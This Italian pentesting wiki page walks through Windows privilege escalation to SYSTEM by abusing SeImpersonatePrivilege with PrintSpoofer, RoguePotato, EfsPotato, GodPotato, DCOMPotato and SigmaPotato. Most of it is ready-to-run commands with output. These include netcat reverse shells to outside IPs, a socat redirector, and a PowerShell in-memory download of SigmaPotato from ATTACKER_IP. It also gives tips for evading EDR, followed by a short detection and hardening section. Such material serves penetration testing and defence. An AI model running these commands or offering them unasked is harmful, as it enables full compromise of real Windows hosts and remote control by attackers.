# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato non funziona** su Windows Server 2019 e Windows 10 build 1809 e successivi. Tuttavia, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** possono essere usati per **ottenere gli stessi privilegi e raggiungere l'accesso a livello `NT AUTHORITY\SYSTEM`**. Questo [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) approfondisce lo strumento `PrintSpoofer`, che può essere usato per abusare dei privilegi di impersonificazione su host Windows 10 e Server 2019 dove JuicyPotato non funziona più.

> [!TIP]
> Un'alternativa moderna frequentemente mantenuta nel 2024–2025 è SigmaPotato (un fork di GodPotato) che aggiunge l'uso in-memory/.NET reflection e supporto esteso per OS. Vedi l'uso rapido più sotto e il repo nei Riferimenti.

Pagine correlate per contesto e tecniche manuali:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Requisiti e problemi comuni

Tutte le seguenti tecniche si basano sull'abuso di un servizio privilegiato con capacità di impersonificazione da un contesto che detiene uno dei seguenti privilegi:

- SeImpersonatePrivilege (il più comune) o SeAssignPrimaryTokenPrivilege
- Non è richiesta integrità elevata se il token possiede già SeImpersonatePrivilege (tipico per molti account di servizio come IIS AppPool, MSSQL, ecc.)

Verifica rapidamente i privilegi:
```cmd
whoami /priv | findstr /i impersonate
```
Note operative:

- PrintSpoofer richiede che il servizio Print Spooler sia in esecuzione e raggiungibile tramite l'endpoint RPC locale (spoolss). In ambienti hardenizzati dove lo Spooler è disabilitato dopo PrintNightmare, preferire RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato richiede un resolver OXID raggiungibile su TCP/135. Se l'egress è bloccato, usare un redirector/port-forwarder (vedi esempio sotto). Build più vecchie richiedevano il flag -f.
- EfsPotato/SharpEfsPotato abusano di MS-EFSR; se una pipe è bloccata, provare pipe alternative (lsarpc, efsrpc, samr, lsass, netlogon).
- L'errore 0x6d3 durante RpcBindingSetAuthInfo indica tipicamente un servizio di autenticazione RPC sconosciuto/non supportato; provare una pipe/transport diverso o assicurarsi che il servizio target sia in esecuzione.

## Demo rapida

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Note:
- Puoi usare -i per avviare un processo interattivo nella console corrente, oppure -c per eseguire un one-liner.
- Richiede il servizio Spooler. Se è disabilitato, questo fallirà.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Se outbound 135 è bloccato, pivot the OXID resolver via socat on your redirector:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Suggerimento: se una pipe fallisce o l'EDR la blocca, prova le altre pipe supportate:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Note:
- Funziona su Windows 8/8.1–11 e Server 2012–2022 quando è presente SeImpersonatePrivilege.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato provides two variants targeting service DCOM objects that default to RPC_C_IMP_LEVEL_IMPERSONATE. Compila o usa i binari forniti ed esegui il tuo comando:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (fork di GodPotato aggiornato)

SigmaPotato aggiunge funzionalità moderne come in-memory execution tramite .NET reflection e un helper per PowerShell reverse shell.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
## Rilevamento e note di hardening

- Monitorare i processi che creano named pipes e che chiamano immediatamente token-duplication APIs seguite da CreateProcessAsUser/CreateProcessWithTokenW. Sysmon può fornire telemetria utile: Event ID 1 (process creation), 17/18 (named pipe created/connected) e linee di comando che avviano processi figli come SYSTEM.
- Spooler hardening: Disabilitare il servizio Print Spooler sui server dove non è necessario previene coercizioni locali in stile PrintSpoofer via spoolss.
- Service account hardening: Minimizzare l'assegnazione di SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege ai servizi custom. Considerare l'esecuzione dei servizi sotto virtual accounts con i privilegi minimi richiesti e isolarli con service SID e write-restricted tokens quando possibile.
- Network controls: Bloccare il traffico TCP/135 in uscita o limitare il traffico dell'RPC endpoint mapper può rompere RoguePotato a meno che non sia disponibile un redirector interno.
- EDR/AV: Tutti questi strumenti sono ampiamente rilevati tramite signature. Ricompilare dal sorgente, rinominare simboli/stringhe o usare l'esecuzione in-memory può ridurre il rilevamento ma non sconfiggerà robuste rilevazioni comportamentali.

## Riferimenti

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)

{{#include ../../banners/hacktricks-training.md}}
